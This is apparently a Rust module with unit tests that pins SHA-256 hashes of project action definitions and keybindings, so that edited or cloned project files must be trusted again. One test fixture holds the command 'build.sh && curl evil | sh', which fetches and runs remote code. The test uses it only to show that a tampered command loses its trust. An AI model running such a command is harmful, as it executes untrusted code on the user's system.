//! Project-trust record (DEC-55, DEC-65; G-ACTIONS §8.3, B-14, B-26).
//!
//! Per project, the record pins:
//! - for each trusted project action whose run kind is gated (`shell`,
//!   `iyke`, `skill`, `workflow`), the SHA-256 of the canonical JSON of its
//!   `run` object (keys sorted, no insignificant whitespace, before
//!   interpolation) — any change to `run` (command, `cwd`, `route`, `skill`,
//!   `confirm`, …) stops matching and the action re-asks;
//! - one entry for the project's `keybindings.json`: the SHA-256 of the
//!   canonical JSON of its `bindings` array — any change to `bindings` holds
//!   every project rule again until re-trusted.
//!
//! The record lives on the user side (`<app_data_dir>/actions-trust.json`),
//! **never under `<project>/.ikenga/`**, so a cloned repository cannot
//! pre-trust itself. Each project entry also records the project root it was
//! granted for; if the project is re-pointed at another folder, the entry no
//! longer applies. Enforcement (refusing a run, holding rules) is WP-52's and
//! WP-53's; this module only answers "is this pinned".

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};

use crate::settings::scope::{read_document_bytes, write_document_bytes_atomic, IkengaDocument};

use super::schema::GATED_RUN_KINDS;

pub const TRUST_FILE_NAME: &str = "actions-trust.json";
const TRUST_VERSION: u32 = 1;

/// Canonical JSON (§8.3): object keys sorted by code point at every level,
/// no whitespace, strings and numbers as serde_json writes them. Independent
/// of serde_json's `preserve_order` feature.
pub fn canonical_json(value: &Value) -> String {
    let mut out = String::new();
    write_canonical(value, &mut out);
    out
}

fn write_canonical(value: &Value, out: &mut String) {
    match value {
        Value::Object(object) => {
            let mut keys: Vec<&String> = object.keys().collect();
            keys.sort();
            out.push('{');
            for (index, key) in keys.into_iter().enumerate() {
                if index > 0 {
                    out.push(',');
                }
                out.push_str(&Value::String(key.clone()).to_string());
                out.push(':');
                write_canonical(&object[key.as_str()], out);
            }
            out.push('}');
        }
        Value::Array(items) => {
            out.push('[');
            for (index, item) in items.iter().enumerate() {
                if index > 0 {
                    out.push(',');
                }
                write_canonical(item, out);
            }
            out.push(']');
        }
        scalar => out.push_str(&scalar.to_string()),
    }
}

pub fn sha256_hex(text: &str) -> String {
    hex::encode(Sha256::digest(text.as_bytes()))
}

/// B-14: the pin for one action's `run`.
pub fn run_hash(run: &Value) -> String {
    sha256_hex(&canonical_json(run))
}

/// B-26: the pin for a keybindings file. An absent `bindings` is `[]`.
pub fn bindings_hash(document: &Value) -> String {
    let empty = Value::Array(Vec::new());
    sha256_hex(&canonical_json(document.get("bindings").unwrap_or(&empty)))
}

pub fn bindings_rule_count(document: &Value) -> usize {
    document
        .get("bindings")
        .and_then(Value::as_array)
        .map_or(0, Vec::len)
}

pub fn is_gated_kind(kind: &str) -> bool {
    GATED_RUN_KINDS.contains(&kind)
}

// ---------------------------------------------------------------------------
// The record on disk
// ---------------------------------------------------------------------------

#[derive(Clone, Debug, Default, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct ProjectTrust {
    /// The canonical project root the pins were granted for.
    pub root: String,
    /// Action id → pinned `run` hash.
    #[serde(default)]
    pub actions: BTreeMap<String, String>,
    /// Pinned `bindings` hash for the project's `keybindings.json`.
    #[serde(default)]
    pub keybindings: Option<String>,
}

#[derive(Clone, Debug, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct TrustFile {
    pub version: u32,
    #[serde(default)]
    pub projects: BTreeMap<String, ProjectTrust>,
}

impl Default for TrustFile {
    fn default() -> Self {
        Self {
            version: TRUST_VERSION,
            projects: BTreeMap::new(),
        }
    }
}

fn validate_trust_bytes(bytes: &[u8]) -> Result<(), String> {
    parse_trust(bytes).map(|_| ())
}

fn parse_trust(bytes: &[u8]) -> Result<TrustFile, String> {
    let file: TrustFile =
        serde_json::from_slice(bytes).map_err(|e| format!("actions trust record: {e}"))?;
    if file.version > TRUST_VERSION {
        return Err(format!(
            "actions trust record version {} is newer than supported version {TRUST_VERSION}",
            file.version
        ));
    }
    Ok(file)
}

const TRUST_DOCUMENT: IkengaDocument = IkengaDocument {
    label: "actions trust record",
    validate: validate_trust_bytes,
};

pub struct TrustStore {
    path: PathBuf,
}

impl TrustStore {
    pub fn new(app_data_dir: &Path) -> Self {
        Self {
            path: app_data_dir.join(TRUST_FILE_NAME),
        }
    }

    pub fn path(&self) -> &Path {
        &self.path
    }

    /// Reads the record. A corrupt record is an error, never silently reset —
    /// resetting would be safe (everything untrusted) but would hide the
    /// problem; the caller surfaces it.
    pub fn load(&self) -> Result<TrustFile, String> {
        match read_document_bytes(&self.path, TRUST_DOCUMENT)? {
            Some(bytes) => parse_trust(&bytes),
            None => Ok(TrustFile::default()),
        }
    }

    pub fn save(&self, file: &TrustFile) -> Result<(), String> {
        let mut bytes = serde_json::to_vec_pretty(file)
            .map_err(|e| format!("serialize actions trust record: {e}"))?;
        bytes.push(b'\n');
        write_document_bytes_atomic(&self.path, &bytes, TRUST_DOCUMENT)
    }
}

impl TrustFile {
    /// The entry for `project_id`, only if it was granted for `root`.
    pub fn project(&self, project_id: &str, root: &str) -> Option<&ProjectTrust> {
        self.projects
            .get(project_id)
            .filter(|entry| entry.root == root)
    }

    /// The entry for `project_id`, reset if it was granted for another root.
    pub fn project_mut(&mut self, project_id: &str, root: &str) -> &mut ProjectTrust {
        let entry = self
            .projects
            .entry(project_id.to_string())
            .or_insert_with(|| ProjectTrust {
                root: root.to_string(),
                ..ProjectTrust::default()
            });
        if entry.root != root {
            *entry = ProjectTrust {
                root: root.to_string(),
                ..ProjectTrust::default()
            };
        }
        entry
    }
}

// ---------------------------------------------------------------------------
// Status
// ---------------------------------------------------------------------------

/// Trust state of one project action, or of the project's keybindings file.
#[derive(Clone, Copy, Debug, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum TrustState {
    /// `chi` / `open`: runs without trust (DEC-55).
    NotGated,
    /// Keybindings only: no project file, or no rules — nothing to hold.
    Absent,
    /// Never trusted: gated runs refuse / rules are held.
    Untrusted,
    /// Pinned, and the pin matches the file.
    Trusted,
    /// Pinned, but the file changed since: re-asks / held again.
    Changed,
}

impl TrustState {
    fn of(pinned: Option<&String>, current: &str) -> Self {
        match pinned {
            None => Self::Untrusted,
            Some(pin) if pin == current => Self::Trusted,
            Some(_) => Self::Changed,
        }
    }
}

#[derive(Clone, Debug, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct ActionTrust {
    pub id: String,
    pub name: Option<String>,
    pub kind: String,
    /// The exact `run` object, for the trust sheet to show verbatim.
    pub run: Value,
    pub hash: String,
    pub state: TrustState,
}

#[derive(Clone, Debug, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct KeybindingsTrust {
    pub hash: Option<String>,
    pub rule_count: usize,
    pub state: TrustState,
}

impl KeybindingsTrust {
    /// DEC-65: whether every project rule is held out of the effective keymap.
    pub fn held(&self) -> bool {
        matches!(self.state, TrustState::Untrusted | TrustState::Changed)
    }
}

/// Per-action trust for a parsed, valid project `actions.json`. Actions
/// whose `run` has no string `kind` are skipped (an invalid file never
/// reaches this point).
pub fn action_trust(document: &Value, pins: Option<&ProjectTrust>) -> Vec<ActionTrust> {
    document
        .get("actions")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter_map(|action| {
            let id = action.get("id")?.as_str()?.to_string();
            let run = action.get("run")?.clone();
            let kind = run.get("kind")?.as_str()?.to_string();
            let hash = run_hash(&run);
            let state = if is_gated_kind(&kind) {
                TrustState::of(pins.and_then(|p| p.actions.get(&id)), &hash)
            } else {
                TrustState::NotGated
            };
            Some(ActionTrust {
                name: action.get("name").and_then(Value::as_str).map(str::to_string),
                id,
                kind,
                run,
                hash,
                state,
            })
        })
        .collect()
}

/// Trust of a project's keybindings file (`None` = file absent).
pub fn keybindings_trust(document: Option<&Value>, pins: Option<&ProjectTrust>) -> KeybindingsTrust {
    let Some(document) = document else {
        return KeybindingsTrust {
            hash: None,
            rule_count: 0,
            state: TrustState::Absent,
        };
    };
    let hash = bindings_hash(document);
    let rule_count = bindings_rule_count(document);
    let state = if rule_count == 0 {
        TrustState::Absent
    } else {
        TrustState::of(pins.and_then(|p| p.keybindings.as_ref()), &hash)
    };
    KeybindingsTrust {
        hash: Some(hash),
        rule_count,
        state,
    }
}

#[derive(Clone, Debug, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct GrantAction {
    pub id: String,
    /// The hash the user was shown; the grant fails if the file moved on.
    pub hash: String,
}

/// Applies a grant to `entry` after checking every requested pin against
/// the current files. All-or-nothing: on error nothing is changed.
///
/// `actions_valid` is whether `current_actions` came from a valid project
/// `actions.json` on disk. Only then are pins for ids the file no longer
/// defines pruned; a malformed (or stale, last-valid) file leaves every
/// existing action pin alone.
pub fn apply_grant(
    entry: &mut ProjectTrust,
    current_actions: &[ActionTrust],
    actions_valid: bool,
    current_keybindings: &KeybindingsTrust,
    actions: &[GrantAction],
    keybindings: Option<&str>,
) -> Result<(), String> {
    for request in actions {
        let Some(current) = current_actions.iter().find(|a| a.id == request.id) else {
            return Err(format!("project action `{}` no longer exists", request.id));
        };
        if current.hash != request.hash {
            return Err(format!(
                "project action `{}` changed since it was shown; review it again",
                request.id
            ));
        }
    }
    if let Some(hash) = keybindings {
        if current_keybindings.hash.as_deref() != Some(hash) {
            return Err(
                "the project keybindings.json changed since it was shown; review it again".into(),
            );
        }
    }
    for request in actions {
        let gated = current_actions
            .iter()
            .any(|a| a.id == request.id && is_gated_kind(&a.kind));
        if gated {
            entry.actions.insert(request.id.clone(), request.hash.clone());
        }
    }
    // Drop pins for actions a valid file no longer defines.
    if actions_valid {
        entry
            .actions
            .retain(|id, _| current_actions.iter().any(|a| &a.id == id));
    }
    if let Some(hash) = keybindings {
        entry.keybindings = Some(hash.to_string());
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn project_actions(command: &str) -> Value {
        json!({ "version": 1, "actions": [
            { "id": "refresh-pulse", "name": "Refresh", "scope": "project",
              "run": { "kind": "shell", "command": command, "confirm": true } },
            { "id": "open-docs", "name": "Docs", "scope": "project",
              "run": { "kind": "open", "url": "https://example.com" } }
        ]})
    }

    fn bindings(key: &str) -> Value {
        json!({ "version": 1, "bindings": [ { "key": key, "command": "refresh-pulse" } ] })
    }

    #[test]
    fn canonical_json_sorts_keys_and_drops_whitespace() {
        let a: Value = serde_json::from_str(r#"{ "b": 1, "a": { "d": [1, 2], "c": "x" } }"#).unwrap();
        let b: Value = serde_json::from_str(r#"{"a":{"c":"x","d":[1,2]},"b":1}"#).unwrap();
        assert_eq!(canonical_json(&a), r#"{"a":{"c":"x","d":[1,2]},"b":1}"#);
        assert_eq!(run_hash(&a), run_hash(&b));
    }

    #[test]
    fn editing_a_trusted_command_flips_it_to_changed() {
        let mut entry = ProjectTrust {
            root: "/p".into(),
            ..ProjectTrust::default()
        };
        let before = action_trust(&project_actions("build.sh"), Some(&entry));
        assert_eq!(before[0].state, TrustState::Untrusted);
        assert_eq!(before[1].state, TrustState::NotGated);
        let grant = [GrantAction {
            id: "refresh-pulse".into(),
            hash: before[0].hash.clone(),
        }];
        let kb = keybindings_trust(None, Some(&entry));
        apply_grant(&mut entry, &before, true, &kb, &grant, None).unwrap();
        let trusted = action_trust(&project_actions("build.sh"), Some(&entry));
        assert_eq!(trusted[0].state, TrustState::Trusted);
        let edited = action_trust(&project_actions("build.sh && curl evil | sh"), Some(&entry));
        assert_eq!(edited[0].state, TrustState::Changed);
        // Any field of run counts, not only the command text.
        let mut confirm_off = project_actions("build.sh");
        confirm_off["actions"][0]["run"]["confirm"] = json!(false);
        assert_eq!(action_trust(&confirm_off, Some(&entry))[0].state, TrustState::Changed);
    }

    #[test]
    fn editing_trusted_bindings_holds_them_again() {
        let mut entry = ProjectTrust {
            root: "/p".into(),
            ..ProjectTrust::default()
        };
        let file = bindings("mod+shift+r");
        let kb = keybindings_trust(Some(&file), Some(&entry));
        assert_eq!(kb.state, TrustState::Untrusted);
        assert!(kb.held());
        let hash = kb.hash.clone().unwrap();
        apply_grant(&mut entry, &[], true, &kb, &[], Some(&hash)).unwrap();
        let kb = keybindings_trust(Some(&file), Some(&entry));
        assert_eq!(kb.state, TrustState::Trusted);
        assert!(!kb.held());
        // A change outside `bindings` does not matter; one inside does.
        let mut other = file.clone();
        other["futureTop"] = json!(1);
        assert_eq!(keybindings_trust(Some(&other), Some(&entry)).state, TrustState::Trusted);
        let edited = bindings("enter");
        let kb = keybindings_trust(Some(&edited), Some(&entry));
        assert_eq!(kb.state, TrustState::Changed);
        assert!(kb.held());
        assert_eq!(keybindings_trust(Some(&json!({"version":1})), Some(&entry)).state, TrustState::Absent);
    }

    #[test]
    fn a_stale_grant_is_refused_whole() {
        let mut entry = ProjectTrust {
            root: "/p".into(),
            ..ProjectTrust::default()
        };
        let current = action_trust(&project_actions("build.sh"), None);
        let kb = keybindings_trust(Some(&bindings("mod+shift+r")), None);
        let stale = [GrantAction {
            id: "refresh-pulse".into(),
            hash: run_hash(&json!({ "kind": "shell", "command": "old.sh" })),
        }];
        let kb_hash = kb.hash.clone().unwrap();
        assert!(apply_grant(&mut entry, &current, true, &kb, &stale, Some(&kb_hash)).is_err());
        assert!(entry.actions.is_empty());
        assert!(entry.keybindings.is_none());
    }

    #[test]
    fn a_keybindings_grant_keeps_action_pins_while_actions_json_is_malformed() {
        let mut entry = ProjectTrust {
            root: "/p".into(),
            ..ProjectTrust::default()
        };
        entry.actions.insert("refresh-pulse".into(), "pinned".into());
        let kb = keybindings_trust(Some(&bindings("mod+shift+r")), None);
        let hash = kb.hash.clone().unwrap();
        // actions.json is malformed: the status carries no actions (or a
        // stale list) and `actions_valid` is false.
        apply_grant(&mut entry, &[], false, &kb, &[], Some(&hash)).unwrap();
        assert_eq!(entry.actions.get("refresh-pulse").map(String::as_str), Some("pinned"));
        assert_eq!(entry.keybindings.as_deref(), Some(hash.as_str()));
        // Against a valid file that no longer defines the id, it is pruned.
        apply_grant(&mut entry, &[], true, &kb, &[], Some(&hash)).unwrap();
        assert!(entry.actions.is_empty());
    }

    #[test]
    fn a_pin_is_bound_to_its_project_root() {
        let mut file = TrustFile::default();
        file.project_mut("p1", "/a").keybindings = Some("h".into());
        assert!(file.project("p1", "/a").is_some());
        assert!(file.project("p1", "/b").is_none());
        assert!(file.project_mut("p1", "/b").keybindings.is_none());
    }

    #[test]
    fn store_round_trips_outside_the_project() {
        let temp = tempfile::TempDir::new().unwrap();
        let store = TrustStore::new(temp.path());
        assert_eq!(store.load().unwrap(), TrustFile::default());
        let mut file = TrustFile::default();
        file.project_mut("p1", "/a").actions.insert("x".into(), "h".into());
        store.save(&file).unwrap();
        assert_eq!(store.load().unwrap(), file);
        assert_eq!(store.path(), temp.path().join(TRUST_FILE_NAME));
    }
}
